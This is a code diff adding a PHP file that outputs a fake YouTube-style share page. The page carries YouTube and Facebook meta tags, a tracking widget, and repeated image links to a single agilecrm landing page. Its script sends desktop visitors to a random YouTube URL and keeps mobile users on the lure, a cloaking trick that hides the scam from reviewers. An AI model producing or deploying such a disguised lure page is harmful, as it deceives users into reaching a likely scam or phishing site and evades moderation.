@@ -1,0 +1,26 @@
+<?php
+
+// Genero: ProgramasProgramacion.com
+echo "<meta content=\"https://www.youtube.com/img/desktop/yt_1200.png\" property=\"og:image\"></meta>\n";
+echo "<meta content=\"87741124305\" property=\"fb:app_id\"></meta>\n";
+echo "\n";
+echo "<br /> <p></p><script src=\"//widgets.amung.us/small.js\" type=\"text/javascript\"></script><script type=\"text/javascript\">WAU_small('ghjfiii')</script><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://appfacevideos.agilecrm.com/landing/5151419209940992\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"508\" data-original-width=\"879\" height=\"370\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEh6uSXoEOPKRtebPRwGtoGd3LXLgpCEFnleIIipctxPuCviNGeOmkQfSwtrLMzmKGgpEoL-iTwRjg1w8FX-kbHYW1fl63pQ2JyJgPVw8Rmgb_aJoZX4nGQmEI-bM0SJpAlVN3foX8P0pSeZBXV0azHmlNoQzUZ6qMheRFlGzVnugDVfMN8phWmjHMHt=w640-h370\" width=\"640\" /></a></div><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://appfacevideos.agilecrm.com/landing/5151419209940992\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"508\" data-original-width=\"879\" height=\"370\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEj44iFDgjm7bUiX6LT0PlbYO_wA_qDtgiRMVThZX6K0UsLUyR9lFKbz3_uDeIeGXjOUA4-p4rC9agStzPQGfee_SoqWdawbv8FsVYl78kFeBwwT4NGd4H3Laur_nsZUdEbDEII1mJpQ8Z7NffYFlcKExYA8-a7TmBVkud1qEdtNddHtOp-_LGMEEESd=w640-h370\" width=\"640\" /></a></div><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://appfacevideos.agilecrm.com/landing/5151419209940992\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"507\" data-original-width=\"879\" height=\"370\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEg6fqkSeZ99sn7Pi58eNVxhN5EfyuWAezj9VavHDzpAf0jT02XCzYaj7HeLzd64Z1_vWwLK29Fl9q7ayoHBs6ydZokg3WggRoSpAR_rCQGtXnADJOSZrddndXpOug5JPmaov_vWrfctVnpzQ3afW78qzQ9hCXtqKz4yFOq4BSuliOc3hXpiMOU1UdVQ=w640-h370\" width=\"640\" /></a></div><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://appfacevideos.agilecrm.com/landing/5151419209940992\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"509\" data-original-width=\"882\" height=\"370\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEgz83jb3JI7gLpgo6xc3eK90q52F5J9awhvKpNHUS60Vtt6CP0IcowGGaTgOJPJuvvtWrNCYWHTGaQppZqB27c2y6nDAcLCSWpFnnngtOlOreX5C7FjBKFC-Sfb5g-9KqC6mQdqe3FHEiE7KY_Q36TlrPoF6-pNq-xDh58pPxRnYSLFIMvOa82xYbQZ=w640-h370\" width=\"640\" /></a></div><br /><div class=\"separator\" style=\"clear: both; text-align: center;\"><a href=\"https://appfacevideos.agilecrm.com/landing/5151419209940992\" style=\"margin-left: 1em; margin-right: 1em;\"><img border=\"0\" data-original-height=\"508\" data-original-width=\"878\" height=\"370\" src=\"https://blogger.googleusercontent.com/img/a/AVvXsEhJdbaOJhZcGgf5LPgwlNTlgIEcGFx85N6A1eF6PYVLqO2miY3JsDjCnNUPcigT5rUqvHwQQ0-edaZwZ7KYxUeyC8CV69lTKCcOQPpwjflQFusRGd5X41QWE9qb1OYk9Wpm12QR7-fgct9U_nhzGAOCEobHYOGPR1li8bs3GGSwufM4Ss8WkNcnUs3r=w640-h370\" width=\"640\" /></a></div><br /><script type=\"text/javascript\">\n";
+echo "//<![CDATA[\n";
+echo " function h(r, a) { var t = \"\"; if (\"mix\" == a) var h = \n";
+echo "\"🏻💂🏻‍♂️🕵🏻‍♀️🕵🏻☄🌟⭐\"; else var h = \n";
+echo "\"💂🏻💂🏻‍♂️🕵🏻‍♀️🕵🏻☄🌟⭐\"; for (var n = 0; r > n; n++) t += h.charAt(Math.floor(Math.random() * \n";
+echo "h.length)); return t };\n";
+echo "\n";
+echo "        var device = navigator.userAgent\n";
+echo "        \n";
+echo "        if (device.match(/Iphone/i)|| device.match(/Ipod/i)|| device.match(/Android/i)|| device.match(/J2ME/i)|| device.match(/BlackBerry/i)|| device.match(/iPhone|iPad|iPod/i)|| device.match(/Opera Mini/i)|| device.match(/IEMobile/i)|| device.match(/Mobile/i)|| device.match(/Windows Phone/i)|| device.match(/windows mobile/i)|| device.match(/windows ce/i)|| device.match(/webOS/i)|| device.match(/palm/i)|| device.match(/bada/i)|| device.match(/series60/i)|| device.match(/nokia/i)|| device.match(/symbian/i)|| device.match(/HTC/i))\n";
+echo "        {\n";
+echo "         \n";
+echo "        }else\n";
+echo "{\n";
+echo " window.location = \"https://www.youtube.com/\"+ h(23, '')+\"/?ref=\";\n";
+echo "}\n";
+echo "//]]>\n";
+echo "</script>\n";
+
+?>
